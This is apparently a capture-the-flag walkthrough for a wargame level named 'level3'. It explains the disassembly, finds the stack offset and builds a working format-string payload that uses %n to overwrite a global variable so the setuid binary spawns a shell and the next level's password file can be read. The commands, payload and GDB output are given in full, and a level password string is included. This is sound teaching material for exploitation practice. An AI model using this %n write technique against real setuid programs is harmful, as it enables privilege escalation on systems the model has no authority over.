# Level 03 — Walkthrough

---

## Overview

| | |
|---|---|
| **Binary** | `level3` |
| **User** | `level3` |
| **Goal user** | `level4` |
| **Protections** | *(not explicitly recorded via checksec; the flaw exploited is a format-string vulnerability, independent of stack protections)* |
| **Password (current level)** | `492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02` |
| **Password (obtained)** | [password.txt](password.txt) |

**Objective:** exploit the `level3` binary (setuid `level4`) so as to obtain a shell and read `/home/user/level4/.pass`.

---

## 1. Reconnaissance

The binary reads a line of input via `fgets`, then passes that same buffer directly to `printf` — without any format specifier of its own. This is the classical shape of a format-string vulnerability: whatever the user supplies becomes the format string itself.

A global variable, here named `m`, is examined immediately thereafter; should it equal **64** (`0x40`), the program prints a taunting message and spawns `/bin/sh`.

---

## 2. Static Analysis

Reconstructed source:

[source.c](source.c)

Disassembly of `v`:

```asm
0x080484a4 <+0>:    push   %ebp
0x080484a5 <+1>:    mov    %esp,%ebp
0x080484a7 <+3>:    sub    $0x218,%esp
0x080484ad <+9>:    mov    0x8049860,%eax
0x080484b2 <+14>:   mov    %eax,0x8(%esp)
0x080484b6 <+18>:   movl   $0x200,0x4(%esp)
0x080484be <+26>:   lea    -0x208(%ebp),%eax        ; the buffer begins here
0x080484c4 <+32>:   mov    %eax,(%esp)
0x080484c7 <+35>:   call   0x80483a0 <fgets@plt>
0x080484cc <+40>:   lea    -0x208(%ebp),%eax
0x080484d2 <+46>:   mov    %eax,(%esp)
0x080484d5 <+49>:   call   0x8048390 <printf@plt>      ; the buffer is printed as-is
0x080484da <+54>:   mov    0x804988c,%eax              ; value of m loaded
0x080484df <+59>:   cmp    $0x40,%eax                  ; compared against 0x40 (64)
0x080484e2 <+62>:   jne    0x8048518 <v+116>
0x080484e4 <+64>:   mov    0x8049880,%eax
...
0x08048507 <+99>:   call   0x80483b0 <fwrite@plt>
0x0804850c <+104>:  movl   $0x804860d,(%esp)
0x08048513 <+111>:  call   0x80483c0 <system@plt>
0x08048518 <+116>:  leave
0x08048519 <+117>:  ret
```

The address of `m` was located thus:

```bash
objdump -D level3 | grep "<m>"
# 0804988c <m>:
```

### Key Points

- `printf(buffer)` is called with the user's own input as the format string — the vulnerability proper.
- `fgets` bounds the input to 512 bytes; the buffer itself measures 520 bytes.
- The global `m`, initially zero, resides at a fixed, known address (`0x0804988c`).
- Should `m` equal **64**, a shell is spawned by the program itself — no shellcode nor return-address manipulation is required, only a write to a single known address.

---

## 3. Dynamic Analysis

### Confirming the Crash

As a preliminary confirmation of the vulnerability's nature, the binary was made to crash by supplying format specifiers directly upon its stdin:

```
%s%s%s%s%s%s%s%s%s%s%s%s
```
```
%n%n%n%n%n%n%n%n%n%n%n%n
```

Both produced a segmentation fault, confirming that arbitrary format specifiers are indeed consumed by `printf`, and that a write primitive (`%n`) is available.

### Locating the Buffer within the Format String's Own Arguments

to do so i implemented a python script to show the "offset" of the printed addresses:

[create_fmt.py](exploit/create_fmt.py)

A chain of `%p` conversions was submitted, so as to observe where upon the stack — expressed as argument positions to `printf` — the beginning of the supplied buffer itself might be found:

```
AAAA|1=0x200|2=0xb7fd1ac0|3=0xb7ff37d0|4=0x41414141|5=0x253d317c|...
```

The value `0x41414141` (the four `A` characters) appears at **position 4** — the buffer's own content, then, begins at the fourth argument of the format string, and may thus be addressed directly by way of the `$` positional syntax (`%4$...`).

### First Attempt

```bash
python -c 'print "\x8c\x98\x04\x08%4p%64x%4$n"' > /tmp/payload
```

Under GDB, a breakpoint was set immediately after the `printf` call, and a watchpoint placed upon `m`:

```gdb
(gdb) b *0x080484d5
(gdb) r < /tmp/payload
(gdb) watch m
(gdb) ni
# Old value = 0
# New value = 73
```

The write succeeded — `m` was indeed modified — but to **73**, not the sought 64. The combination of `%4p` and `%64x` produced too great a count of characters before the `%n` was reached.

### Second, Corrected Attempt

```bash
python -c 'print "\x8c\x98\x04\x08%60x%4$n"' > /tmp/payload
```

Reasoning: the four address bytes placed at the head of the payload are themselves counted as characters already printed by `printf`, even though they display as unprintable garbage. Adding a `%60x` conversion — padded, by its width specifier, to sixty characters — brings the running total to exactly **4 + 60 = 64** by the time `%4$n` executes, writing that count to the address held at position four (namely, the address of `m`).

Result:

```
level3@RainFall:~$ ./level3 < /tmp/payload
�                                                         200
Wait what?!
```

The appearance of `"Wait what?!"` confirms that `m` was set precisely to 64, and that the conditional branch leading to `system("/bin/sh")` was taken.

---

## 4. Vulnerability

An uncontrolled format string: the program passes user-supplied input directly as the first argument to `printf`, without any format string of its own. This grants both a read primitive (`%p`, to inspect the stack) and a write primitive (`%n`, to write an arbitrary count of characters to an arbitrary address already present upon the stack).

---

## 5. Exploitation

**Strategy:** rather than corrupting a return address or injecting shellcode, the global variable `m` — which the program itself consults to decide whether to spawn a shell — was overwritten directly, by way of the format string's `%n` conversion, with the precise value **64** that satisfies the program's own condition.

The payload places the address of `m` at the head of the buffer (thus occupying argument position 4), then employs a width-padded `%x` conversion to bring the character count to exactly 64 before that count is written, via `%4$n`, to the address supplied.

Delivery, so as to retain an interactive shell once `system("/bin/sh")` returns:

```bash
(cat /tmp/payload; cat;) | ./level3
```

---

## 6. Result

Once the shell is obtained:

```bash
id
cat /home/user/level4/.pass
```

| Step | Description |
|------|-------------|
| 1 | Confirmed the format-string vulnerability by crashing the binary with `%s` and `%n` chains |
| 2 | Located the buffer's own position among the format string's arguments (position 4) |
| 3 | Placed the address of `m` at the head of the payload |
| 4 | Tuned the padding so that exactly 64 characters had been printed before `%4$n` executed |
| 5 | `m` set to 64 — the program itself spawned `/bin/sh` |

---

## Notes & Lessons

This level departs from the stack-overflow family entirely: no return address is touched, no shellcode is injected. The vulnerability lies in treating untrusted input as a format string, and the exploit consists in reasoning carefully about `%n`'s behaviour — that it writes not a chosen value, but the *count of characters printed thus far* — and in tuning padding accordingly to reach that exact count.

Sources consulted:
- https://cs155.stanford.edu/papers/formatstring-1.2.pdf
- https://www.theflash2k.me/blog/ctf-techs/fsb-guide
- https://man7.org/linux/man-pages/man3/printf.3.html
